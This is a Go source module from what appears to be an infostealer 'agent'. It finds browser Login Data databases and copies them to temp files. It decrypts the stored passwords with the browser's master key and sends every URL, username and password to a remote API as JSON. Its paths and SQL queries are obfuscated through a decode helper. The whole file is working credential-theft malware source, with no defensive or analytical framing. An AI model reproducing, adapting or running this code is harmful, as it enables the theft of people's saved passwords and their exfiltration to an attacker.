package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"database/sql"
	"os"
	"path"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

func readPasswords(p string, bp string) []vars.TPassword {
	var (
		res  []vars.TPassword
		rows *sql.Rows = nil
		db   *sql.DB   = nil
	)

	state := path.Join(bp, lib.Decode(vars.Path_localst))
	master, err := lib.GetMaster(state)
	if err != nil {
		return res
	}

	temp := lib.CopyTemp(p)
	if temp == "" {
		return res
	}

	db, err = sql.Open("sqlite3", temp)
	if err != nil {
		goto DONE
	}

	rows, err = db.Query(lib.Decode(vars.Query_password))
	if err != nil {
		lib.Print(vars.Msg_DumpError,
			lib.Decode(vars.Module_password), err.Error())
		goto DONE
	}

	for rows.Next() {
		var pwd vars.TPassword
		var enc []byte
		err := rows.Scan(&pwd.URL, &pwd.Username, &enc)
		if err != nil {
			continue
		}

		pwd.Password, err = lib.DecryptPass(string(enc), master)
		if err != nil {
			continue
		}

		res = append(res, pwd)
	}

DONE:
	if rows != nil {
		rows.Close()
	}

	if db != nil {
		db.Close()
	}

	lib.CleanTemp(temp)
	return res
}

func dumpPasswords(b vars.Browser) ([]vars.TPassword, error) {
	var res []vars.TPassword
	dec := lib.Decode(b.Path)

	if dec == "" {
		return res, lib.NewErr(vars.Msg_BadEnc)
	}

	fp := path.Join(os.Getenv(lib.Decode(b.Prefix)), dec)
	pwds := lib.FindFiles(fp,
		lib.Decode(vars.Path_logindata), false)

	for _, p := range pwds {
		res = append(res, readPasswords(p, fp)...)
	}

	for i := range res {
		res[i].From = lib.Decode(b.Name)
	}

	return res, nil
}

func GetPasswords(wg *sync.WaitGroup) {
	for _, b := range vars.Browsers {
		cs, err := dumpPasswords(b)
		if err != nil {
			lib.Print(vars.Msg_DumpError,
				lib.Decode(vars.Module_password), err.Error())
		}

		vars.Agent.Password = append(vars.Agent.Password, cs...)
	}

	lib.Print(vars.Msg_Entries,
		lib.Decode(vars.Module_password), len(vars.Agent.Password))
	err := api.SendJSON(lib.Decode(vars.Module_password), struct {
		Password []vars.TPassword `json:"ST_MAP$json.password_data$"`
	}{
		Password: vars.Agent.Password,
	})
	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_password), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_password))
	wg.Done()
}
